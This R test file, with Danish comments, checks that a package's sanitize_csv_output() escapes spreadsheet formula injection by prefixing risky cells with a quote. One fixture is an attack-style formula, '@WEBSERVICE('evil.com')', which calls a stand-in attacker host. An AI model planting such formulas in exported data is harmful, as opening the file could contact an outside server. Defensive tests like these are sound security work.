# test-csv-formula-injection.R
# Tests: sanitize_csv_output() blokerer Excel formula injection (Phase 3)

test_that("sanitize_csv_output() prefix-escaper = med enkelt-quote", {
  skip_if(
    !exists("sanitize_csv_output",
      where = asNamespace("biSPCharts"), mode = "function"
    ),
    "sanitize_csv_output ikke tilgængelig"
  )

  data <- data.frame(val = "=SUM(A1:A10)", stringsAsFactors = FALSE)
  result <- biSPCharts:::sanitize_csv_output(data)
  expect_equal(result$val, "'=SUM(A1:A10)")
})

test_that("sanitize_csv_output() prefix-escaper + prefix", {
  skip_if(
    !exists("sanitize_csv_output",
      where = asNamespace("biSPCharts"), mode = "function"
    ),
    "sanitize_csv_output ikke tilgængelig"
  )

  data <- data.frame(val = "+1234", stringsAsFactors = FALSE)
  result <- biSPCharts:::sanitize_csv_output(data)
  expect_equal(result$val, "'+1234")
})

test_that("sanitize_csv_output() prefix-escaper - prefix", {
  skip_if(
    !exists("sanitize_csv_output",
      where = asNamespace("biSPCharts"), mode = "function"
    ),
    "sanitize_csv_output ikke tilgængelig"
  )

  data <- data.frame(val = "-1234", stringsAsFactors = FALSE)
  result <- biSPCharts:::sanitize_csv_output(data)
  expect_equal(result$val, "'-1234")
})

test_that("sanitize_csv_output() prefix-escaper @ prefix", {
  skip_if(
    !exists("sanitize_csv_output",
      where = asNamespace("biSPCharts"), mode = "function"
    ),
    "sanitize_csv_output ikke tilgængelig"
  )

  data <- data.frame(val = "@WEBSERVICE('evil.com')", stringsAsFactors = FALSE)
  result <- biSPCharts:::sanitize_csv_output(data)
  expect_equal(result$val, "'@WEBSERVICE('evil.com')")
})

test_that("sanitize_csv_output() prefix-escaper tab prefix", {
  skip_if(
    !exists("sanitize_csv_output",
      where = asNamespace("biSPCharts"), mode = "function"
    ),
    "sanitize_csv_output ikke tilgængelig"
  )

  data <- data.frame(val = "\tcmd", stringsAsFactors = FALSE)
  result <- biSPCharts:::sanitize_csv_output(data)
  expect_equal(result$val, "'\tcmd")
})

test_that("sanitize_csv_output() berører ikke normale værdier", {
  skip_if(
    !exists("sanitize_csv_output",
      where = asNamespace("biSPCharts"), mode = "function"
    ),
    "sanitize_csv_output ikke tilgængelig"
  )

  data <- data.frame(
    normal = c("Hej verden", "12345", "SPC data"),
    antal = c(1L, 2L, 3L),
    stringsAsFactors = FALSE
  )
  result <- biSPCharts:::sanitize_csv_output(data)
  expect_equal(result$normal, data$normal)
  expect_equal(result$antal, data$antal)
})

test_that("sanitize_csv_output() håndterer NA i string-kolonner", {
  skip_if(
    !exists("sanitize_csv_output",
      where = asNamespace("biSPCharts"), mode = "function"
    ),
    "sanitize_csv_output ikke tilgængelig"
  )

  data <- data.frame(
    val = c("=FORMULA", NA_character_, "normal"),
    stringsAsFactors = FALSE
  )
  result <- biSPCharts:::sanitize_csv_output(data)
  expect_equal(result$val[1], "'=FORMULA")
  expect_true(is.na(result$val[2]))
  expect_equal(result$val[3], "normal")
})

test_that("sanitize_csv_output() fejler på non-data.frame input", {
  skip_if(
    !exists("sanitize_csv_output",
      where = asNamespace("biSPCharts"), mode = "function"
    ),
    "sanitize_csv_output ikke tilgængelig"
  )

  expect_error(biSPCharts:::sanitize_csv_output("ikke en data.frame"))
  expect_error(biSPCharts:::sanitize_csv_output(c("a", "b")))
})
